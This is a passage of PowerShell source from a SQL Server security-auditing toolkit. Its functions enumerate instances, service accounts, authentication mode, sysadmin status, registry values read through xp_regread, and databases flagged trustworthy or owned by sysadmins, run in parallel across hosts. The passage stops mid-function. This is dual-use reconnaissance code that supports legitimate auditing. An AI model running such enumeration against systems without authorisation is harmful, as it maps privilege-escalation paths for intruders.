        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Setup data table for output
        $TblServerInfo = New-Object -TypeName System.Data.DataTable
        $null = $TblServerInfo.Columns.Add('ComputerName')
        $null = $TblServerInfo.Columns.Add('Instance')
        $null = $TblServerInfo.Columns.Add('DomainName')
        $null = $TblServerInfo.Columns.Add('ServiceName')
        $null = $TblServerInfo.Columns.Add('ServiceAccount')
        $null = $TblServerInfo.Columns.Add('AuthenticationMode')
        $null = $TblServerInfo.Columns.Add('Clustered')
        $null = $TblServerInfo.Columns.Add('SQLServerVersionNumber')
        $null = $TblServerInfo.Columns.Add('SQLServerMajorVersion')
        $null = $TblServerInfo.Columns.Add('SQLServerEdition')
        $null = $TblServerInfo.Columns.Add('SQLServerServicePack')
        $null = $TblServerInfo.Columns.Add('OSArchitecture')
        $null = $TblServerInfo.Columns.Add('OsMachineType')
        $null = $TblServerInfo.Columns.Add('OSVersionName')
        $null = $TblServerInfo.Columns.Add('OsVersionNumber')
        $null = $TblServerInfo.Columns.Add('Currentlogin')
        $null = $TblServerInfo.Columns.Add('IsSysadmin')
        $null = $TblServerInfo.Columns.Add('ActiveSessions')

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable

        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Default connection to local default instance
            if(-not $Instance)
            {
                $Instance = $env:COMPUTERNAME
            }

            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Get number of active sessions for server
            $ActiveSessions = Get-SQLSession -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose |
            Where-Object -FilterScript {
                $_.SessionStatus -eq 'running'
            } |
            Measure-Object -Line |
            Select-Object -Property Lines -ExpandProperty Lines

            # Get sysadmin status
            $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

            if($IsSysadmin -eq 'Yes')
            {
                # Grab additional information if sysadmin
                $SysadminSetup = "
                    -- Get machine type
                    DECLARE @MachineType  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                    @value_name		= N'ProductType',
                    @value			= @MachineType output

                    -- Get OS version
                    DECLARE @ProductName  SYSNAME
                    EXECUTE master.dbo.xp_regread
                    @rootkey		= N'HKEY_LOCAL_MACHINE',
                    @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion',
                    @value_name		= N'ProductName',
                @value			= @ProductName output"

                $SysadminQuery = '  @MachineType as [OsMachineType],
                @ProductName as [OSVersionName],'
            }
            else
            {
                $SysadminSetup = ''
                $SysadminQuery = ''
            }

            # Define Query
            $Query = "  -- Get SQL Server Information

                -- Get SQL Server Service Name and Path
                DECLARE @SQLServerInstance varchar(250)
                DECLARE @SQLServerServiceName varchar(250)
                if @@SERVICENAME = 'MSSQLSERVER'
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                set @SQLServerServiceName = 'MSSQLSERVER'
                END
                ELSE
                BEGIN
                set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))
                set @SQLServerServiceName = 'MSSQL$'+cast(@@SERVICENAME as varchar(250))
                END

                -- Get SQL Server Service Account
                DECLARE @ServiceaccountName varchar(250)
                EXECUTE master.dbo.xp_instance_regread
                N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
                N'ObjectName',@ServiceAccountName OUTPUT, N'no_output'

                -- Get authentication mode
                DECLARE @AuthenticationMode INT
                EXEC master.dbo.xp_instance_regread N'HKEY_LOCAL_MACHINE',
                N'Software\Microsoft\MSSQLServer\MSSQLServer',
                N'LoginMode', @AuthenticationMode OUTPUT

                -- Grab additional information as sysadmin
                $SysadminSetup

                -- Return server and version information
                SELECT  '$ComputerName' as [ComputerName],
                @@servername as [Instance],
                DEFAULT_DOMAIN() as [DomainName],
                @SQLServerServiceName as [ServiceName],
                @ServiceAccountName as [ServiceAccount],
                (SELECT CASE @AuthenticationMode
                WHEN 1 THEN 'Windows Authentication'
                WHEN 2 THEN 'Windows and SQL Server Authentication'
                ELSE 'Unknown'
                END) as [AuthenticationMode],
                CASE  SERVERPROPERTY('IsClustered')
                WHEN 0
                THEN 'No'
                ELSE 'Yes'
                END as [Clustered],
                SERVERPROPERTY('productversion') as [SQLServerVersionNumber],
                SUBSTRING(@@VERSION, CHARINDEX('2', @@VERSION), 4) as [SQLServerMajorVersion],
                serverproperty('Edition') as [SQLServerEdition],
                SERVERPROPERTY('ProductLevel') AS [SQLServerServicePack],
                SUBSTRING(@@VERSION, CHARINDEX('x', @@VERSION), 3) as [OSArchitecture],
                $SysadminQuery
                RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as [OsVersionNumber],
                SYSTEM_USER as [Currentlogin],
                '$IsSysadmin' as [IsSysadmin],
            '$ActiveSessions' as [ActiveSessions]"
            # Execute Query
            $TblServerInfoTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append as needed
            $TblServerInfoTemp |
            ForEach-Object -Process {
                # Add row
                $null = $TblServerInfo.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DomainName,
                    $_.ServiceName,
                    $_.ServiceAccount,
                    $_.AuthenticationMode,
                    $_.Clustered,
                    $_.SQLServerVersionNumber,
                    $_.SQLServerMajorVersion,
                    $_.SQLServerEdition,
                    $_.SQLServerServicePack,
                    $_.OSArchitecture,
                    $_.OsMachineType,
                    $_.OSVersionName,
                    $_.OsVersionNumber,
                    $_.Currentlogin,
                    $_.IsSysadmin,
                    $_.ActiveSessions
                )
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblServerInfo
    }
}


# ----------------------------------
#  Get-SQLDatabase
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabase
{
    <#
            .SYNOPSIS
            Returns database information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER NoDefaults
            Only select non default databases.
            .PARAMETER HasAccess
            Only select databases the current user has access to.
            .PARAMETER SysAdminOnly
            Only select databases owned by a sysadmin.
            .EXAMPLE
            PS C:\> Get-SQLDatabase -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseId          : 7
            DatabaseName        : testdb
            DatabaseOwner       : sa
            OwnerIsSysadmin     : 1
            is_trustworthy_on   : True
            is_db_chaining_on   : False
            is_broker_enabled   : True
            is_encrypted        : False
            is_read_only        : False
            create_date         : 4/13/2016 4:27:36 PM
            recovery_model_desc : FULL
            FileName            : C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\DATA\testdb.mdf
            DbSizeMb            : 3.19
            has_dbaccess        : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabase -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ComputerName')
        $null = $TblDatabases.Columns.Add('Instance')
        $null = $TblDatabases.Columns.Add('DatabaseId')
        $null = $TblDatabases.Columns.Add('DatabaseName')
        $null = $TblDatabases.Columns.Add('DatabaseOwner')
        $null = $TblDatabases.Columns.Add('OwnerIsSysadmin')
        $null = $TblDatabases.Columns.Add('is_trustworthy_on')
        $null = $TblDatabases.Columns.Add('is_db_chaining_on')
        $null = $TblDatabases.Columns.Add('is_broker_enabled')
        $null = $TblDatabases.Columns.Add('is_encrypted')
        $null = $TblDatabases.Columns.Add('is_read_only')
        $null = $TblDatabases.Columns.Add('create_date')
        $null = $TblDatabases.Columns.Add('recovery_model_desc')
        $null = $TblDatabases.Columns.Add('FileName')
        $null = $TblDatabases.Columns.Add('DbSizeMb')
        $null = $TblDatabases.Columns.Add('has_dbaccess')

        # Setup database filter
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            $NoDefaultsFilter = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $NoDefaultsFilter = ''
        }

        # Setup HasAccess filter
        if($HasAccess)
        {
            $HasAccessFilter = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $HasAccessFilter = ''
        }

        # Setup owner is sysadmin filter
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Check version
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Base query
        $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            a.database_id as [DatabaseId],
            a.name as [DatabaseName],
            SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
            IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
            a.is_trustworthy_on,
        a.is_db_chaining_on,"

        # Version specific columns
        if([int]$SQLVersionShort -ge 10)
        {
            $QueryVerSpec = '
                a.is_broker_enabled,
                a.is_encrypted,
            a.is_read_only,'
        }

        # Query end
        $QueryEnd = '
            a.create_date,
            a.recovery_model_desc,
            b.filename as [FileName],
            (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
            from sys.master_files where name like a.name) as [DbSizeMb],
            HAS_DBACCESS(a.name) as [has_dbaccess]
            FROM [sys].[databases] a
        INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

        # User defined filters
        $Filters = "
            $DatabaseFilter
            $NoDefaultsFilter
            $HasAccessFilter
            $SysAdminOnlyFilter
        ORDER BY a.database_id"

        $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results for pipeline items
        $TblResults |
        ForEach-Object -Process {
            # Set version specific values
            if([int]$SQLVersionShort -ge 10)
            {
                $is_broker_enabled = $_.is_broker_enabled
                $is_encrypted = $_.is_encrypted
                $is_read_only = $_.is_read_only
            }
            else
            {
                $is_broker_enabled = 'NA'
                $is_encrypted = 'NA'
                $is_read_only = 'NA'
            }

            $null = $TblDatabases.Rows.Add(
                $_.ComputerName,
                $_.Instance,
                $_.DatabaseId,
                $_.DatabaseName,
                $_.DatabaseOwner,
                $_.OwnerIsSysadmin,
                $_.is_trustworthy_on,
                $_.is_db_chaining_on,
                $is_broker_enabled,
                $is_encrypted,
                $is_read_only,
                $_.create_date,
                $_.recovery_model_desc,
                $_.FileName,
                $_.DbSizeMb,
                $_.has_dbaccess
            )
        }

    }

    End
    {
        # Return data
        $TblDatabases
    }
}


# ----------------------------------
#  Get-SQLDatabaseThreaded
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabaseThreaded
{
    <#
            .SYNOPSIS
            Returns database information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER NoDefaults
            Only select non default databases.
            .PARAMETER HasAccess
            Only select databases the current user has access to.
            .PARAMETER SysAdminOnly
            Only select databases owned by a sysadmin.
            .PARAMETER Threads
            Number of concurrent host threads.
            .EXAMPLE
            PS C:\> Get-SQLDatabaseThreaded -Instance SQLServer1\STANDARDDEV2014 -NoDefaults -DatabaseName testdb

            ComputerName        : SQLServer1
            Instance            : SQLServer1\STANDARDDEV2014
            DatabaseId          : 7
            DatabaseName        : testdb
            DatabaseOwner       : sa
            OwnerIsSysadmin     : 1
            is_trustworthy_on   : True
            is_db_chaining_on   : False
            is_broker_enabled   : True
            is_encrypted        : False
            is_read_only        : False
            create_date         : 4/13/2016 4:27:36 PM
            recovery_model_desc : FULL
            FileName            : C:\Program Files\Microsoft SQL Server\MSSQL12.STANDARDDEV2014\MSSQL\DATA\testdb.mdf
            DbSizeMb            : 3.19
            has_dbaccess        : 1
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseThreaded -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select non default databases.')]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases the current user has access to.')]
        [switch]$HasAccess,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only select databases owned by a sysadmin.')]
        [switch]$SysAdminOnly,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of threads.')]
        [int]$Threads = 2,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblDatabases = New-Object -TypeName System.Data.DataTable
        $null = $TblDatabases.Columns.Add('ComputerName')
        $null = $TblDatabases.Columns.Add('Instance')
        $null = $TblDatabases.Columns.Add('DatabaseId')
        $null = $TblDatabases.Columns.Add('DatabaseName')
        $null = $TblDatabases.Columns.Add('DatabaseOwner')
        $null = $TblDatabases.Columns.Add('OwnerIsSysadmin')
        $null = $TblDatabases.Columns.Add('is_trustworthy_on')
        $null = $TblDatabases.Columns.Add('is_db_chaining_on')
        $null = $TblDatabases.Columns.Add('is_broker_enabled')
        $null = $TblDatabases.Columns.Add('is_encrypted')
        $null = $TblDatabases.Columns.Add('is_read_only')
        $null = $TblDatabases.Columns.Add('create_date')
        $null = $TblDatabases.Columns.Add('recovery_model_desc')
        $null = $TblDatabases.Columns.Add('FileName')
        $null = $TblDatabases.Columns.Add('DbSizeMb')
        $null = $TblDatabases.Columns.Add('has_dbaccess')

        # Setup database filter
        if($DatabaseName)
        {
            $DatabaseFilter = " and a.name like '$DatabaseName'"
        }
        else
        {
            $DatabaseFilter = ''
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            $NoDefaultsFilter = " and a.name not in ('master','tempdb','msdb','model')"
        }
        else
        {
            $NoDefaultsFilter = ''
        }

        # Setup HasAccess filter
        if($HasAccess)
        {
            $HasAccessFilter = ' and HAS_DBACCESS(a.name)=1'
        }
        else
        {
            $HasAccessFilter = ''
        }

        # Setup owner is sysadmin filter
        if($SysAdminOnly)
        {
            $SysAdminOnlyFilter = " and IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid))=1"
        }
        else
        {
            $SysAdminOnlyFilter = ''
        }

        # Setup data table for pipeline threading
        $PipelineItems = New-Object -TypeName System.Data.DataTable


        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Ensure provided instance is processed
        if($Instance)
        {
            $ProvideInstance = New-Object -TypeName PSObject -Property @{
                Instance = $Instance
            }
        }

        # Add instance to instance list
        $PipelineItems = $PipelineItems + $ProvideInstance
    }

    Process
    {
        # Create list of pipeline items
        $PipelineItems = $PipelineItems + $_
    }

    End
    {
        # Define code to be multi-threaded
        $MyScriptBlock = {
            # Set instance
            $Instance = $_.Instance

            # Parse computer name from the instance
            $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

            # Test connection to instance
            $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
                $_.Status -eq 'Accessible'
            }
            if($TestConnection)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Success."
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : Connection Failed."
                }
                return
            }

            # Check version
            $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
            if($SQLVersionFull)
            {
                $SQLVersionShort = $SQLVersionFull.Split('.')[0]
            }

            # Base query
            $QueryStart = "  SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                a.database_id as [DatabaseId],
                a.name as [DatabaseName],
                SUSER_SNAME(a.owner_sid) as [DatabaseOwner],
                IS_SRVROLEMEMBER('sysadmin',SUSER_SNAME(a.owner_sid)) as [OwnerIsSysadmin],
                a.is_trustworthy_on,
            a.is_db_chaining_on,"

            # Version specific columns
            if([int]$SQLVersionShort -ge 10)
            {
                $QueryVerSpec = '
                    a.is_broker_enabled,
                    a.is_encrypted,
                a.is_read_only,'
            }

            # Query end
            $QueryEnd = '
                a.create_date,
                a.recovery_model_desc,
                b.filename as [FileName],
                (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2))
                from sys.master_files where name like a.name) as [DbSizeMb],
                HAS_DBACCESS(a.name) as [has_dbaccess]
                FROM [sys].[databases] a
            INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid WHERE 1=1'

            # User defined filters
            $Filters = "
                $DatabaseFilter
                $NoDefaultsFilter
                $HasAccessFilter
                $SysAdminOnlyFilter
            ORDER BY a.database_id"

            $Query = "$QueryStart $QueryVerSpec $QueryEnd $Filters"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results for pipeline items
            $TblResults |
            ForEach-Object -Process {
                # Set version specific values
                if([int]$SQLVersionShort -ge 10)
                {
                    $is_broker_enabled = $_.is_broker_enabled
                    $is_encrypted = $_.is_encrypted
                    $is_read_only = $_.is_read_only
                }
                else
                {
                    $is_broker_enabled = 'NA'
                    $is_encrypted = 'NA'
                    $is_read_only = 'NA'
                }

                $null = $TblDatabases.Rows.Add(
                    $_.ComputerName,
                    $_.Instance,
                    $_.DatabaseId,
                    $_.DatabaseName,
                    $_.DatabaseOwner,
                    $_.OwnerIsSysadmin,
                    $_.is_trustworthy_on,
                    $_.is_db_chaining_on,
                    $is_broker_enabled,
                    $is_encrypted,
                    $is_read_only,
                    $_.create_date,
                    $_.recovery_model_desc,
                    $_.FileName,
                    $_.DbSizeMb,
                    $_.has_dbaccess
                )
            }
        }

        # Run scriptblock using multi-threading
        $PipelineItems | Invoke-Parallel -ScriptBlock $MyScriptBlock -ImportSessionFunctions -ImportVariables -Throttle $Threads -RunspaceTimeout 2 -Quiet -ErrorAction SilentlyContinue

        return $TblDatabases
    }
}


# ----------------------------------
#  Get-SQLTable
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLTable
{
    <#
            .SYNOPSIS
            Returns table information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER TableName
            Table name to filter for.
            .PARAMETER NoDefaults
            Filter out results from default databases.
            .EXAMPLE
            PS C:\> Get-SQLTable -Instance SQLServer1\STANDARDDEV2014 -NoDefaults  -DatabaseName testdb

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : dbo
            TableName    : NOCList
            TableType    : BASE TABLE

            ComputerName : SQLServer1
            Instance     : SQLServer1\STANDARDDEV2014
            DatabaseName : testdb
            SchemaName   : dbo
            TableName    : tracking
            TableType    : BASE TABLE
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Get-SQLTable -Verbose -NoDefaults
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't select tables from default databases.")]
        [switch]$NoDefaults,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        $TblTables = New-Object -TypeName System.Data.DataTable

        # Setup table filter
        if($TableName)
        {
            $TableFilter = " where table_name like '%$TableName%'"
        }
        else
        {
            $TableFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin or DBO privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Grabbing tables from databases below:"
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Setup NoDefault filter
        if($NoDefaults)
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -NoDefaults -SuppressVerbose
        }
        else
        {
            # Get list of databases
            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
        }

        # Get tables for each database
        $TblDatabases |
        ForEach-Object -Process {
            # Get database name
            $DbName = $_.DatabaseName

            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : - $DbName"
            }

            # Define Query
            $Query = "  USE $DbName;
                SELECT  '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                TABLE_CATALOG AS [DatabaseName],
                TABLE_SCHEMA AS [SchemaName],
                TABLE_NAME as [TableName],
                TABLE_TYPE as [TableType]
                FROM [$DbName].[INFORMATION_SCHEMA].[TABLES]
                $TableFilter
            ORDER BY TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME"

            # Execute Query
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

            # Append results
            $TblTables = $TblTables + $TblResults
        }
    }

    End
    {
        # Return data
        $TblTables
    }
}


# ----------------------------------
#  Get-SQLColumn
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLColumn
{
    <#
            .SYNOPSIS
            Returns column information from target SQL Servers. Supports keyword search.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name filter.
            .PARAMETER TableName
            Table name filter.
            .PARAMETER ColumnName
            Column name filter.
            .PARAMETER ColumnNameSearch
            Column name filter that support wildcards.
            .PARAMETER NoDefaults
            Don't list anything from default databases.
            .EXAMPLE
            PS C:\> Get-SQLColumn -Verbose -Instance "SQLServer1"
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLColumn -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database name.')]
        [string]$DatabaseName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Table name.')]
        [string]$TableName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter by exact column name.')]
        [string]$ColumnName,

